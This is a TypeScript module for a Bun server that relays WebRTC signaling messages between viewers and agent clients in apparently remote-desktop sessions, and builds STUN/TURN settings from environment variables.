import type { ServerWebSocket } from "bun";
import { encode as msgpackEncode } from "@msgpack/msgpack";

import * as clientManager from "../clientManager";
import { logger } from "../logger";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";

type AgentRtcEnvelope = {
  type: string;
  sessionId?: string;
  sdp?: string;
  candidate?: string;
  sdpMid?: string;
  sdpMLineIndex?: number;
};

function sendAgent(ws: { send: (data: Uint8Array) => unknown }, payload: Record<string, unknown>) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[rtc] agent send failed", err);
  }
}

function sendViewer(ws: ServerWebSocket<SocketData>, payload: Record<string, unknown>) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[rtc] viewer send failed", err);
  }
}

export function relayViewerRtcToAgent(
  ws: ServerWebSocket<SocketData>,
  payload: Record<string, unknown>,
): void {
  const { clientId, sessionId } = ws.data;
  if (!clientId || !sessionId) return;
  const target = clientManager.getClient(clientId);
  if (!target) return;

  const type = String(payload.type || "");
  if (type !== "rtc_offer" && type !== "rtc_ice" && type !== "rtc_close") return;

  const envelope: Record<string, unknown> = { ...payload, type, sessionId };
  if (type === "rtc_offer") {
    envelope.sdp = String(payload.sdp || "");
    if (!envelope.sdp) return;
  } else if (type === "rtc_ice") {
    envelope.candidate = String(payload.candidate || "");
    envelope.sdpMid = String(payload.sdpMid || "");
    envelope.sdpMLineIndex = Number(payload.sdpMLineIndex || 0);
    if (!envelope.candidate) return;
  }
  sendAgent(target.ws, envelope);
}

export function relayAgentRtcToViewer(payload: AgentRtcEnvelope): void {
  const sessionId = String(payload.sessionId || "");
  if (!sessionId) return;
  const session = sessionManager.getRdSession(sessionId);
  if (!session) {
    return;
  }
  const type = String(payload.type || "");
  if (type !== "rtc_answer" && type !== "rtc_ice") return;

  const envelope: Record<string, unknown> = { type, sessionId };
  if (type === "rtc_answer") {
    envelope.sdp = String(payload.sdp || "");
    if (!envelope.sdp) return;
  } else if (type === "rtc_ice") {
    envelope.candidate = String(payload.candidate || "");
    envelope.sdpMid = String(payload.sdpMid || "");
    envelope.sdpMLineIndex = Number(payload.sdpMLineIndex || 0);
    if (!envelope.candidate) return;
  }
  sendViewer(session.viewer, envelope);
}

export function notifyAgentRtcClose(clientId: string, sessionId: string): void {
  if (!clientId || !sessionId) return;
  const target = clientManager.getClient(clientId);
  if (!target) return;
  sendAgent(target.ws, { type: "rtc_close", sessionId });
}

export type IceServerConfig = {
  urls: string | string[];
  username?: string;
  credential?: string;
};

export function buildIceServers(): IceServerConfig[] {
  const stunUrl = (process.env.OVERLORD_STUN_URL || "").trim();
  const turnUrl = (process.env.OVERLORD_TURN_URL || "").trim();
  const turnUser = (process.env.OVERLORD_TURN_USERNAME || "").trim();
  const turnPass = (process.env.OVERLORD_TURN_CREDENTIAL || "").trim();

  const servers: IceServerConfig[] = [];
  if (stunUrl) {
    servers.push({ urls: stunUrl });
  }
  if (turnUrl) {
    if (turnUser && turnPass) {
      servers.push({ urls: turnUrl, username: turnUser, credential: turnPass });
    } else {
      logger.warn("[rtc] OVERLORD_TURN_URL set but no credentials — relay will fail to allocate");
      servers.push({ urls: turnUrl });
    }
  }
  if (servers.length === 0) {
    logger.warn("[rtc] no STUN/TURN configured — WebRTC viewer will not connect (relay-only policy)");
  }
  return servers;
}
